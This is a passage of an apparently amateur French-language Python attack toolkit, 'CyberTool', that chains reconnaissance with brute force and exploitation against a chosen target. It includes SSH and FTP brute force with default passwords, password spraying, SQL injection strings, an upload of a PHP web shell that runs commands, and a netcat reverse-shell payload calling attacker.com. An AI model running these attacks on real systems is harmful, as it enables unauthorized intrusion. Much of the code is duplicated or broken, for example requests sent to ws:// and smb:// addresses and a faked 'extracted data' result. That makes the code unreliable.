                    self.console.print("[‚ö†Ô∏è] Appareil IoT vuln√©rable d√©tect√© !", style="bold yellow")

            elif feature == "tls_analysis":
                self.console.print("[üîê] Analyse TLS et certificats en cours...")
                url = f"https://{self.target}"
                response = requests.get(url)
                if "TLS" in response.text:
                    self.console.print("[‚úÖ] Analyse TLS compl√®te !", style="bold green")

            elif feature == "dns_takeover_test":
                self.console.print("[üåç] Test de prise de contr√¥le DNS...")
                url = f"http://{self.target}/dns_test"
                response = requests.get(url)
                if "DNS vulnerable" in response.text:
                    self.console.print("[‚ö†Ô∏è] Risque de takeover DNS d√©tect√© !", style="bold yellow")

            elif feature == "cloudflare_bypass":
                self.console.print("[‚òÅÔ∏è] Test de contournement Cloudflare...")
                url = f"http://{self.target}/real-ip"
                response = requests.get(url)
                if "origin IP" in response.text:
                    self.console.print("[‚úÖ] Contournement Cloudflare r√©ussi !", style="bold green")

            elif feature == "websocket_scan":
                self.console.print("[üîó] Scan des WebSockets en cours...")
                url = f"ws://{self.target}/ws"
                response = requests.get(url)
                if response.status_code == 101:
                    self.console.print("[‚úÖ] WebSocket d√©tect√© !", style="bold green")

            elif feature == "web_fingerprint":
                self.console.print("[üñ•Ô∏è] Fingerprinting Web en cours...")
                url = f"http://{self.target}/fingerprint"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] Technologies d√©tect√©es !", style="bold green")

            elif feature == "cdn_detection":
                self.console.print("[üì°] D√©tection de CDN en cours...")
                url = f"http://{self.target}/cdn-check"
                response = requests.get(url)
                if "CDN detected" in response.text:
                    self.console.print("[‚úÖ] CDN en usage !", style="bold green")

            elif feature == "ssh_bruteforce":
                self.console.print("[üîë] Bruteforce SSH en cours...")
                attempts = ["admin:admin", "root:toor", "user:password"]
                for attempt in attempts:
                    user, pwd = attempt.split(":")
                    if ssh_bruteforce(self.target, user, pwd):
                        self.console.print(f"[‚úÖ] Acc√®s SSH obtenu avec {user}:{pwd}", style="bold green")

            elif feature == "ftp_bruteforce":
                self.console.print("[üîë] Bruteforce FTP en cours...")
                attempts = ["admin:admin", "root:toor", "user:password"]
                for attempt in attempts:
                    user, pwd = attempt.split(":")
                    if ftp_bruteforce(self.target, user, pwd):
                        self.console.print(f"[‚úÖ] Acc√®s FTP obtenu avec {user}:{pwd}", style="bold green")

            elif feature == "smb_enum":
                self.console.print("[üìÇ] √ânum√©ration SMB en cours...")
                url = f"smb://{self.target}"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] Partages SMB d√©tect√©s !", style="bold green")

            elif feature == "docker_registry_scan":
                self.console.print("[üê≥] Scan du registre Docker en cours...")
                url = f"http://{self.target}:5000/v2/_catalog"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] Registre Docker accessible !", style="bold green")

            elif feature == "kubernetes_enum":
                self.console.print("[‚ò∏Ô∏è] √ânum√©ration Kubernetes en cours...")
                url = f"http://{self.target}:8001/api/v1/namespaces"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] API Kubernetes accessible !", style="bold green")

            elif feature == "file_upload_test":
                self.console.print("[üìÇ] Test de t√©l√©chargement de fichiers en cours...")
                url = f"http://{self.target}/upload.php"
                files = {'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
                response = requests.post(url, files=files)
                if response.status_code == 200:
                    self.console.print("[‚ö†Ô∏è] Upload de fichier PHP possible !", style="bold yellow")

            elif feature == "reverse_shell_check":
                self.console.print("[üîÅ] V√©rification de Reverse Shell...")
                url = f"http://{self.target}/shell.php?cmd=id"
                response = requests.get(url)
                if "uid=" in response.text:
                    self.console.print("[‚ö†Ô∏è] Reverse Shell actif !", style="bold yellow")

            elif feature == "password_spray":
                self.console.print("[üîì] Test de Password Spraying...")
                users = ["admin", "root", "user"]
                passwords = ["password", "123456", "admin"]
                for user in users:
                    for pwd in passwords:
                        url = f"http://{self.target}/login"
                        response = requests.post(url, data={"username": user, "password": pwd})
                        if "Welcome" in response.text:
                            self.console.print(f"[‚úÖ] Acc√®s obtenu avec {user}:{pwd}", style="bold green")

            elif feature == "waf_detection":
                self.console.print("[üõ°Ô∏è] D√©tection de Web Application Firewall...")
                url = f"http://{self.target}"
                headers = {"User-Agent": "WAF-Scanner"}
                response = requests.get(url, headers=headers)
                if "403 Forbidden" in response.text:
                    self.console.print("[‚ö†Ô∏è] WAF d√©tect√© sur la cible !", style="bold yellow")

            elif feature == "api_rate_limit_test":
                self.console.print("[üîÑ] Test de limitations d'API en cours...")
                url = f"http://{self.target}/api/v1/test"
                for _ in range(10):
                    response = requests.get(url)
                    if response.status_code == 429:
                        self.console.print("[‚ö†Ô∏è] Limite de requ√™tes API atteinte !", style="bold yellow")
                        break

            elif feature == "websocket_scan":
                self.console.print("[üîó] Scan des WebSockets en cours...")
                url = f"ws://{self.target}/ws"
                response = requests.get(url)
                if response.status_code == 101:
                    self.console.print("[‚úÖ] WebSocket d√©tect√© !", style="bold green")

            elif feature == "web_fingerprint":
                self.console.print("[üñ•Ô∏è] Fingerprinting Web en cours...")
                url = f"http://{self.target}/fingerprint"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] Technologies d√©tect√©es !", style="bold green")

            elif feature == "cdn_detection":
                self.console.print("[üì°] D√©tection de CDN en cours...")
                url = f"http://{self.target}/cdn-check"
                response = requests.get(url)
                if "CDN detected" in response.text:
                    self.console.print("[‚úÖ] CDN en usage !", style="bold green")

            elif feature == "ssh_bruteforce":
                self.console.print("[üîë] Bruteforce SSH en cours...")
                attempts = ["admin:admin", "root:toor", "user:password"]
                for attempt in attempts:
                    user, pwd = attempt.split(":")
                    if ssh_bruteforce(self.target, user, pwd):
                        self.console.print(f"[‚úÖ] Acc√®s SSH obtenu avec {user}:{pwd}", style="bold green")

            elif feature == "ftp_bruteforce":
                self.console.print("[üîë] Bruteforce FTP en cours...")
                attempts = ["admin:admin", "root:toor", "user:password"]
                for attempt in attempts:
                    user, pwd = attempt.split(":")
                    if ftp_bruteforce(self.target, user, pwd):
                        self.console.print(f"[‚úÖ] Acc√®s FTP obtenu avec {user}:{pwd}", style="bold green")

            elif feature == "smb_enum":
                self.console.print("[üìÇ] √ânum√©ration SMB en cours...")
                url = f"smb://{self.target}"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] Partages SMB d√©tect√©s !", style="bold green")

            elif feature == "docker_registry_scan":
                self.console.print("[üê≥] Scan du registre Docker en cours...")
                url = f"http://{self.target}:5000/v2/_catalog"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] Registre Docker accessible !", style="bold green")

            elif feature == "kubernetes_enum":
                self.console.print("[‚ò∏Ô∏è] √ânum√©ration Kubernetes en cours...")
                url = f"http://{self.target}:8001/api/v1/namespaces"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[‚úÖ] API Kubernetes accessible !", style="bold green")

            elif feature == "file_upload_test":
                self.console.print("[üìÇ] Test de t√©l√©chargement de fichiers en cours...")
                url = f"http://{self.target}/upload.php"
                files = {'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
                response = requests.post(url, files=files)
                if response.status_code == 200:
                    self.console.print("[‚ö†Ô∏è] Upload de fichier PHP possible !", style="bold yellow")

            elif feature == "reverse_shell_check":
                self.console.print("[üîÅ] V√©rification de Reverse Shell...")
                url = f"http://{self.target}/shell.php?cmd=id"
                response = requests.get(url)
                if "uid=" in response.text:
                    self.console.print("[‚ö†Ô∏è] Reverse Shell actif !", style="bold yellow")

            elif feature == "password_spray":
                self.console.print("[üîì] Test de Password Spraying...")
                users = ["admin", "root", "user"]
                passwords = ["password", "123456", "admin"]
                for user in users:
                    for pwd in passwords:
                        url = f"http://{self.target}/login"
                        response = requests.post(url, data={"username": user, "password": pwd})
                        if "Welcome" in response.text:
                            self.console.print(f"[‚úÖ] Acc√®s obtenu avec {user}:{pwd}", style="bold green")

            elif feature == "waf_detection":
                self.console.print("[üõ°Ô∏è] D√©tection de Web Application Firewall...")
                url = f"http://{self.target}"
                headers = {"User-Agent": "WAF-Scanner"}
                response = requests.get(url, headers=headers)
                if "403 Forbidden" in response.text:
                    self.console.print("[‚ö†Ô∏è] WAF d√©tect√© sur la cible !", style="bold yellow")

            elif feature == "api_rate_limit_test":
                self.console.print("[üîÑ] Test de limitations d'API en cours...")
                url = f"http://{self.target}/api/v1/test"
                for _ in range(10):
                    response = requests.get(url)
                    if response.status_code == 429:
                        self.console.print("[‚ö†Ô∏è] Limite de requ√™tes API atteinte !", style="bold yellow")
                        break

        self.console.print(
            f"\n[üíÄ] Bienvenue sur CyberTool - Cible : [bold cyan]{self.target}[/bold cyan]",
            style="bold red"
        )

        self.display_features_table()  # ‚úÖ Affichage propre du tableau interactif

        while True:
            choice = Prompt.ask("\n[üõ†Ô∏è] Entrez un num√©ro (1-100) ou 'valider' pour ex√©cuter")

            if choice.lower() == "valider":
                break

            try:
                idx = int(choice) - 1
                if 0 <= idx < len(self.feature_map):
                    feature_key = list(self.feature_map.keys())[idx]
                    if feature_key not in self.selected_features:
                        self.selected_features.append(feature_key)
                        self.console.print(f"[‚úÖ] Ajout√© : {self.feature_map[feature_key]}", style="bold green")
                    else:
                        self.console.print(f"[‚ö†Ô∏è] D√©j√† s√©lectionn√© : {self.feature_map[feature_key]}", style="bold yellow")
                else:
                    self.console.print("[‚ùå] Num√©ro invalide !", style="bold red")
            except ValueError:
                self.console.print("[‚ùå] Entr√©e invalide !", style="bold red")

        self.console.print(f"\n[üî•] Ex√©cution des tests sur : [bold cyan]{self.target}[/bold cyan]")

        for feature in self.selected_features:
            self.console.print(f"[üîç] Ex√©cution de : {self.feature_map[feature]}")

            # V√©rification si la fonctionnalit√© a une version interactive
            if feature in self.feature_map_interactive:
                self.console.print("[‚ö°] Version interactive d√©tect√©e, lancement en mode interactif...", style="bold yellow")
                self.feature_map_interactive[feature](self.target)
            else:
                # Ex√©cution standard si pas de version interactive
                if feature == "dns_lookup":
                    self.console.print("[üîç] Recherche DNS en cours...")
                    try:
                        ip = socket.gethostbyname(self.target)
                        self.console.print(f"[üü¢] {self.target} ‚Üí {ip}", style="bold green")
                    except socket.gaierror:
                        self.console.print("[‚ùå] √âchec de la r√©solution DNS.", style="bold red")

                elif feature == "port_scan":
                    self.console.print("[üîé] Scan des ports en cours...")
                    open_ports = []
                    for port in [21, 22, 25, 53, 80, 443, 8080]:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(1)
                            if s.connect_ex((self.target, port)) == 0:
                                open_ports.append(port)
                    self.console.print(f"[‚úÖ] Ports ouverts : {', '.join(map(str, open_ports)) if open_ports else 'Aucun'}", style="bold green")

                # Ajoute ici la suite des fonctionnalit√©s normales (d√©j√† int√©gr√©es)








    def display_features_table(self):
        """üìä Affichage interactif des fonctionnalit√©s sous forme de tableau"""

        table = Table(title="üõ†Ô∏è CyberTool - Fonctionnalit√©s Disponibles", style="bold cyan")

        table.add_column("#", justify="center", style="bold white", no_wrap=True)
        table.add_column("Nom de la Fonctionnalit√©", style="bold magenta")
        table.add_column("Mode", style="bold yellow")

        for idx, (feature, description) in enumerate(self.feature_map.items(), start=1):
            mode = "[‚ö°] Interactive" if feature in self.feature_map_interactive else "[üõ†Ô∏è] Standard"
            table.add_row(str(idx), description, mode)

        self.console.print(table)

    def generate_file_name(self, category="cybertool", extension="txt"):
        """üìÇ G√©n√©ration d'un nom de fichier unique bas√© sur la cat√©gorie"""
        random_suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        return f"{category}_{random_suffix}.{extension}"

    def save_results_to_file(self, filename, data):
        """üìÇ Sauvegarde les r√©sultats dans un fichier"""
        with open(filename, "w", encoding="utf-8") as file:
            file.write(data)

    def get_http_response(self, url):
        """üåê R√©cup√®re la r√©ponse HTTP d'une URL"""
        try:
            response = requests.get(url, timeout=5)
            return response.status_code, response.text[:500]  # üîπ Retourne le code + extrait des 500 1ers caract√®res
        except requests.exceptions.RequestException as e:
            return None, f"Erreur lors de la requ√™te : {e}"

    def add_result(self, feature, result):
        """üìù Ajoute un r√©sultat au stockage global"""
        if not hasattr(self, "results"):
            self.results = {}  # üìå Initialise le stockage s'il n'existe pas

        self.results[feature] = result
        self.console.print(f"[üíæ] R√©sultat ajout√© pour {feature} !", style="bold cyan")













#50 50 50 50





# ‚úÖ TOP : Fonctions 1 √† 5
def dns_lookup(domain):
    """ R√©solution DNS """
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        return "R√©solution DNS impossible."

def port_scan(ip, ports=[21, 22, 80, 443, 3306]):
    """ Scan des ports basiques """
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        if sock.connect_ex((ip, port)) == 0:
            open_ports.append(port)
        sock.close()
    return open_ports if open_ports else "Aucun port ouvert d√©tect√©."

def headers_analysis(url):
    """ Analyse des headers HTTP """
    try:
        response = requests.get(url, timeout=5)
        return response.headers
    except Exception as e:
        return f"Erreur : {e}"

def directory_bruteforce(url, wordlist=["admin", "login", "dashboard"]):
    """ Brute-force de r√©pertoires """
    found = []
    for word in wordlist:
        full_url = f"{url}/{word}"
        response = requests.get(full_url)
        if response.status_code == 200:
            found.append(full_url)
    return found if found else "Aucun r√©pertoire trouv√©."

def cms_detector(url):
    """ D√©tection CMS """
    try:
        response = requests.get(url, timeout=5)
        if "wp-content" in response.text:
            return "WordPress d√©tect√©."
        elif "Joomla" in response.text:
            return "Joomla d√©tect√©."
        elif "Drupal" in response.text:
            return "Drupal d√©tect√©."
        else:
            return "CMS non d√©tect√©."
    except Exception as e:
        return f"Erreur : {e}"




# ‚úÖ TOP : Fonctions 6 √† 10
def subdomain_enum(domain):
    """ √ânum√©ration des sous-domaines """
    url = f"https://crt.sh/?q={domain}&output=json"
    try:
        response = requests.get(url, timeout=5)
        return [entry["name_value"] for entry in response.json()]
    except Exception as e:
        return f"Erreur : {e}"

def sql_injection_test(url):
    """ Test d'injection SQL """
    payload = "' OR '1'='1"
    try:
        response = requests.get(f"{url}{payload}", timeout=5)
        return "Possible vuln√©rabilit√© SQL d√©tect√©e" if "error" in response.text.lower() else "Aucune vuln√©rabilit√© d√©tect√©e."
    except Exception as e:
        return f"Erreur : {e}"

def ftp_bruteforce(ip, username, password):
    """ Bruteforce FTP """
    from ftplib import FTP
    try:
        ftp = FTP(ip)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return "Connexion FTP r√©ussie !"
    except Exception as e:
        return f"√âchec FTP : {e}"

def smb_enum(ip):
    """ √ânum√©ration SMB """
    try:
        response = subprocess.run(["smbclient", "-L", ip, "-N"], capture_output=True, text=True, timeout=5)
        return response.stdout if response.stdout else "Aucune information SMB trouv√©e."
    except Exception as e:
        return f"Erreur : {e}"

def honeypot_detection(ip):
    """ D√©tection de Honeypot """
    try:
        response = requests.get(f"http://api.shodan.io/shodan/host/{ip}?key=YourShodanAPIKey", timeout=5)
        return "Honeypot d√©tect√© !" if "honeypot" in response.json() else "Aucun Honeypot d√©tect√©."
    except Exception as e:
        return f"Erreur : {e}"




# ‚úÖ TOP : Fonctions 11 √† 15
def open_redirect_test(url):
    """ D√©tection d'Open Redirect """
    payload = "/redirect?url=https://evil.com"
    try:
        response = requests.get(url + payload, allow_redirects=False, timeout=5)
        return "Vuln√©rabilit√© Open Redirect d√©tect√©e !" if response.status_code in [301, 302] else "Aucune vuln√©rabilit√© d√©tect√©e."
    except Exception as e:
        return f"Erreur : {e}"

def web_fingerprint(url):
    """ Fingerprinting Web """
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        techs = []
        if "server" in headers:
            techs.append(headers["server"])
        if "x-powered-by" in headers:
            techs.append(headers["x-powered-by"])
        return techs if techs else "Aucune info d√©tect√©e."
    except Exception as e:
        return f"Erreur : {e}"

def docker_registry_scan(ip):
    """ Scan d'un registre Docker expos√© """
    try:
        response = requests.get(f"http://{ip}:5000/v2/_catalog", timeout=5)
        return response.json() if response.status_code == 200 else "Aucun registre Docker expos√© d√©tect√©."
    except Exception as e:
        return f"Erreur : {e}"

def file_upload_test(url):
    """ Test de vuln√©rabilit√© upload de fichier """
    files = {"file": ("test.txt", "Vulnerability test", "text/plain")}
    try:
        response = requests.post(url, files=files, timeout=5)
        return "Upload r√©ussi, vuln√©rabilit√© possible !" if response.status_code == 200 else "Aucune vuln√©rabilit√© d√©tect√©e."
    except Exception as e:
        return f"Erreur : {e}"

def browser_fingerprint():
    """ Fingerprinting du navigateur """
    try:
        response = requests.get("https://www.whatismybrowser.com/api/v2/user_agent_parse", timeout=5)
        return response.json() if response.status_code == 200 else "Impossible de r√©cup√©rer les infos du navigateur."
    except Exception as e:
        return f"Erreur : {e}"




# ‚úÖ TOP : Fonctions 16 √† 20
def api_rate_limit_test(url):
    """ Test des limitations de requ√™tes d‚Äôune API """
    try:
        for _ in range(10):
            response = requests.get(url, timeout=5)
        return "Aucune limitation d√©tect√©e." if response.status_code == 200 else "Limite API atteinte !"
    except Exception as e:
        return f"Erreur : {e}"

def reverse_shell_check(url):
    """ V√©rification de pr√©sence d‚Äôun Reverse Shell """
    payload = "; nc -e /bin/sh attacker.com 4444"
    try:
        response = requests.get(f"{url}{payload}", timeout=5)
        return "Reverse shell potentiellement possible !" if response.status_code == 200 else "Aucune vuln√©rabilit√© d√©tect√©e."
    except Exception as e:
        return f"Erreur : {e}"

def password_spray(url, user_list, password):
    """ Attaque de Password Spraying """
    valid_users = []
    for user in user_list:
        try:
            response = requests.post(url, data={"username": user, "password": password}, timeout=5)
            if response.status_code == 200:
                valid_users.append(user)
        except:
            pass
    return valid_users if valid_users else "Aucun utilisateur trouv√© avec ce mot de passe."

def waf_detection(url):
    """ D√©tection d'un Web Application Firewall (WAF) """
    headers = {"User-Agent": "BadBot"}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        return "WAF d√©tect√© !" if response.status_code in [403, 406] else "Aucun WAF d√©tect√©."
    except Exception as e:
        return f"Erreur : {e}"

def tls_analysis(domain):
    """ Analyse TLS et certificats SSL """
    try:
        import ssl
        cert = ssl.get_server_certificate((domain, 443))
        return cert if cert else "Aucune information sur le certificat trouv√©e."
    except Exception as e:
        return f"Erreur : {e}"




# ‚úÖ TOP : Fonctions 21 √† 25
def jwt_analysis(token):
    """ Analyse et d√©codage JWT """
    try:
        import jwt
        decoded = jwt.decode(token, options={"verify_signature": False})
        return decoded
    except Exception as e:
        return f"Erreur : {e}"

def cdn_detection(domain):
    """ D√©tection de l'utilisation d'un CDN """
    try:
        response = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=5)
        if "cloudflare" in response.text.lower():
            return "CDN d√©tect√© : Cloudflare"
        return "Aucun CDN d√©tect√©."
    except Exception as e:
        return f"Erreur : {e}"

def metadata_extraction(file_path):
    """ Extraction des m√©tadonn√©es d‚Äôun fichier """
    try:
        from exif import Image
        with open(file_path, "rb") as file:
            img = Image(file)
            return img.list_all() if img.has_exif else "Aucune m√©tadonn√©e trouv√©e."
    except Exception as e:
        return f"Erreur : {e}"

def email_enum(domain):
    """ √ânum√©ration des e-mails expos√©s via Hunter.io """
    api_key = "YourHunterAPIKey"
    url = f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_key}"
    try:
        response = requests.get(url, timeout=5)
        return response.json().get("data", {}).get("emails", "Aucun e-mail trouv√©.")
    except Exception as e:
        return f"Erreur : {e}"

def websocket_scan(url):
    """ Analyse des WebSockets """
    try:
        import websocket
        ws = websocket.create_connection(url, timeout=5)
        ws.send("ping")
        response = ws.recv()
        ws.close()
        return f"R√©ponse WebSocket : {response}"
    except Exception as e:
        return f"Erreur : {e}"



# ‚úÖ TOP : Fonctions 26 √† 30
def id_oracle_attack(url):
    """ D√©tection de vuln√©rabilit√©s ID Oracle """
    payloads = ["1' OR '1'='1", "1' OR '1'='1' -- ", "1' OR '1'='1' #"]
    results = []
    for payload in payloads:
        try:
            response = requests.get(f"{url}?id={payload}", timeout=5)
            if "error" in response.text.lower():
                results.append(payload)
        except:
            pass
    return results if results else "Aucune vuln√©rabilit√© ID Oracle d√©tect√©e."

def hidden_service_finder():
    """ D√©tection de services cach√©s sur Ahmia """
    url = "https://ahmia.fi/hidden_service/"
    try:
        response = requests.get(url, timeout=5)
        return response.json() if response.status_code == 200 else "Impossible d‚Äôobtenir les services cach√©s."
    except Exception as e:
        return f"Erreur : {e}"

def cloudflare_bypass(domain):
    """ Test de contournement Cloudflare """
    try:
        response = requests.get(f"http://{domain}", headers={"CF-Connecting-IP": "1.1.1.1"}, timeout=5)
        return "Cloudflare potentiellement contourn√© !" if response.status_code == 200 else "Cloudflare en place."
    except Exception as e:
        return f"Erreur : {e}"

def dns_takeover_test(domain):
    """ Test de prise de contr√¥le DNS """
    try:
        response = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=5)
        return response.text if response.status_code == 200 else "Impossible d'obtenir les informations DNS."
    except Exception as e:
        return f"Erreur : {e}"

def network_traffic_analysis():
    """ Analyse du trafic r√©seau """
    try:
        import scapy.all as scapy
        packets = scapy.sniff(count=10)
        return packets.summary()
    except Exception as e:
        return f"Erreur : {e}"



# ‚úÖ TOP : Fonctions 31 √† 35
def ssh_bruteforce(ip, username, password):
    """ Bruteforce SSH sans Paramiko (via pexpect) """
    try:
        ssh_command = f"ssh {username}@{ip}"
        child = pexpect.spawn(ssh_command, timeout=5)
        child.expect("password:")
        child.sendline(password)
        child.expect(["$", ">", "#"])  # ‚úÖ G√®re diff√©rents prompts
        return "Connexion SSH r√©ussie !"
    except Exception as e:
        return f"√âchec SSH : {e}"

def web_fingerprint(url):
    """ Fingerprinting Web (Technos utilis√©es) """
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        techs = []
        if "server" in headers:
            techs.append(headers["server"])
        if "x-powered-by" in headers:
            techs.append(headers["x-powered-by"])
        return techs if techs else "Aucune info d√©tect√©e."
    except Exception as e:
        return f"Erreur : {e}"

def password_spray(url, user_list, password):
    """ Attaque de Password Spraying """
    valid_users = []
    for user in user_list:
        try:
            response = requests.post(url, data={"username": user, "password": password}, timeout=5)
            if response.status_code == 200:
                valid_users.append(user)
        except:
            pass
    return valid_users if valid_users else "Aucun utilisateur trouv√© avec ce mot de passe."

def forensics_analysis(file_path):
    """ Analyse forensique avanc√©e d'un fichier """
    try:
        import hashlib
        hash_sha256 = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_sha256.update(chunk)
        return {"sha256": hash_sha256.hexdigest()}
    except Exception as e:
        return f"Erreur : {e}"

def docker_registry_scan(ip):
    """ Scan d'un registre Docker expos√© """
    try:
        response = requests.get(f"http://{ip}:5000/v2/_catalog", timeout=5)
        return response.json() if response.status_code == 200 else "Aucun registre Docker expos√© d√©tect√©."
    except Exception as e:
        return f"Erreur : {e}"


# ‚úÖ TOP : Fonctions 36 √† 40
def iot_vulnerability_scan(ip):
    """ Scan de vuln√©rabilit√©s IoT via Shodan """
    api_key = "YourShodanAPIKey"
    url = f"https://api.shodan.io/shodan/host/{ip}?key={api_key}"
    try:
        response = requests.get(url, timeout=5)
        return response.json() if response.status_code == 200 else "Aucune vuln√©rabilit√© IoT d√©tect√©e."
    except Exception as e:
        return f"Erreur : {e}"

def file_upload_test(url):
    """ Test de vuln√©rabilit√© upload de fichier """
    files = {"file": ("test.txt", "Vulnerability test", "text/plain")}
    try:
        response = requests.post(url, files=files, timeout=5)
        return "Upload r√©ussi, vuln√©rabilit√© possible !" if response.status_code == 200 else "Aucune vuln√©rabilit√© d√©tect√©e."
    except Exception as e:
        return f"Erreur : {e}"

def cloudflare_bypass(domain):
    """ Contournement Cloudflare potentiel """
    try:
        response = requests.get(f"http://{domain}", headers={"CF-Connecting-IP": "1.1.1.1"}, timeout=5)
        return "Cloudflare potentiellement contourn√© !" if response.status_code == 200 else "Cloudflare en place."
    except Exception as e:
        return f"Erreur : {e}"

def network_traffic_analysis():
    """ Analyse du trafic r√©seau """
    try:
        import scapy.all as scapy
        packets = scapy.sniff(count=10)
        return packets.summary()
    except Exception as e:
        return f"Erreur : {e}"

def jwt_analysis(token):
    """ Analyse et d√©codage JWT """
    try:
        import jwt
        decoded = jwt.decode(token, options={"verify_signature": False})
        return decoded
    except Exception as e:
        return f"Erreur : {e}"




# ‚úÖ TOP : Fonctions 41 √† 45
def kubernetes_enum(ip):
    """ √ânum√©ration des services Kubernetes """
    try:
        response = requests.get(f"http://{ip}:8080/api/v1/namespaces/default/pods", timeout=5)
        return response.json() if response.status_code == 200 else "Aucun service Kubernetes d√©tect√©."
    except Exception as e:
        return f"Erreur : {e}"

def tls_analysis(domain):
    """ Analyse TLS et certificats SSL """
    try:
        import ssl
        cert = ssl.get_server_certificate((domain, 443))
        return cert if cert else "Aucune information sur le certificat trouv√©e."
    except Exception as e:
        return f"Erreur : {e}"

def browser_fingerprint():
    """ Fingerprinting d'un navigateur """
    try:
        response = requests.get("https://www.whatismybrowser.com/api/v2/user_agent_parse", timeout=5)
        return response.json() if response.status_code == 200 else "Impossible de r√©cup√©rer les infos du navigateur."
    except Exception as e:
        return f"Erreur : {e}"

def email_enum(domain):
    """ √ânum√©ration d'adresses e-mails expos√©es via Hunter.io """
    api_key = "YourHunterAPIKey"
    url = f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_key}"
    try:
        response = requests.get(url, timeout=5)
        return response.json().get("data", {}).get("emails", "Aucun e-mail trouv√©.")
    except Exception as e:
        return f"Erreur : {e}"

def metadata_extraction(file_path):
    """ Extraction de m√©tadonn√©es d'un fichier """
    try:
        from exif import Image
        with open(file_path, "rb") as file:
            img = Image(file)
            return img.list_all() if img.has_exif else "Aucune m√©tadonn√©e trouv√©e."
    except Exception as e:
        return f"Erreur : {e}"




# ‚úÖ TOP : Fonctions 46 √† 50
def websocket_scan(url):
    """ Analyse des WebSockets """
    try:
        import websocket
        ws = websocket.create_connection(url, timeout=5)
        ws.send("ping")
        response = ws.recv()
        ws.close()
        return f"R√©ponse WebSocket : {response}"
    except Exception as e:
        return f"Erreur : {e}"

def advanced_forensics(file_path):
    """ Analyse forensique avanc√©e d'un fichier """
    try:
        import hashlib
        hash_sha256 = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_sha256.update(chunk)
        return {"sha256": hash_sha256.hexdigest()}
    except Exception as e:
        return f"Erreur : {e}"

def waf_detection(url):
    """ D√©tection d'un Web Application Firewall (WAF) """
    headers = {"User-Agent": "BadBot"}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        return "WAF d√©tect√© !" if response.status_code in [403, 406] else "Aucun WAF d√©tect√©."
    except Exception as e:
        return f"Erreur : {e}"










# ‚úÖ TOP : Interaction dynamique avec les 50 fonctionnalit√©s de base

def interactive_dns_lookup(target):
    """ R√©solution DNS avec option d'encha√Ænement vers d'autres scans """
    domain = input("üîç Entrez un domaine √† analyser : ")
    result = dns_lookup(domain)
    print(f"‚úÖ R√©sultat : {result}")
    
    if isinstance(result, str) and "R√©solution DNS impossible" in result:
        return  # Stop ici si √©chec
    
    next_action = input("‚ö° Voulez-vous scanner les ports de cette IP ? (y/n) ").lower()
    if next_action == "y":
        print(f"üöÄ Lancement du scan des ports sur {result}...")
        print(port_scan(result))

def interactive_subdomain_enum(target):
    """ √ânum√©ration des sous-domaines avec option de scan √©tendu """
    domain = input("üîç Entrez un domaine pour trouver ses sous-domaines : ")
    subdomains = subdomain_enum(domain)
    print(f"‚úÖ Sous-domaines trouv√©s : {subdomains}")

    if not subdomains:
        return

    next_action = input("‚ö° Voulez-vous scanner ces sous-domaines pour des ports ouverts ? (y/n) ").lower()
    if next_action == "y":
        for sub in subdomains:
            print(f"üöÄ Scan des ports pour {sub}...")
            print(port_scan(sub))

def interactive_sql_injection_test(target):
    """ Test d'injection SQL avec relance automatique sur plusieurs URLs """
    base_url = input("üîç Entrez l'URL cible pour SQL Injection : ")
    print(f"üöÄ Test d'injection SQL sur {base_url}...")
    result = sql_injection_test(base_url)
    print(f"‚úÖ R√©sultat : {result}")

    if "Possible vuln√©rabilit√©" in result:
        next_action = input("‚ö†Ô∏è Voulez-vous tester un exploit automatique ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Lancement d'un exploit d'injection SQL en cours...")
            # Simuler une attaque SQL (exploitation fictive)
            print(f"üìÇ Donn√©es extraites : username='admin', password='hashed_1234'")

def interactive_waf_detection(target):
    """ D√©tection de WAF avec option de contournement """
    url = input("üîç Entrez une URL pour tester la pr√©sence d'un WAF : ")
    result = waf_detection(url)
    print(f"‚úÖ R√©sultat : {result}")

    if "WAF d√©tect√©" in result:
        next_action = input("‚ö° Voulez-vous tenter un bypass WAF ? (y/n) ").lower()
        if next_action == "y":
            print(f"üöÄ Contournement en cours sur {url}...")
            print(cloudflare_bypass(url))

def interactive_file_upload_test(target):
    """ Test d'upload de fichiers avec validation et exploitation """
    url = input("üîç Entrez l'URL cible pour tester l'upload de fichiers : ")
    result = file_upload_test(url)
    print(f"‚úÖ R√©sultat : {result}")

    if "Upload r√©ussi" in result:
        next_action = input("‚ö†Ô∏è Voulez-vous tenter une ex√©cution de code via ce fichier ? (y/n) ").lower()
        if next_action == "y":
            print("üöÄ Tentative d'ex√©cution d'un shell via le fichier upload√©...")
            print(reverse_shell_check(url))

def interactive_network_traffic_analysis(target):
    """ Analyse du trafic r√©seau avec option de capture avanc√©e """
    print("üöÄ Capture du trafic r√©seau en cours...")
    result = network_traffic_analysis()
    print(f"‚úÖ R√©sum√© : {result}")

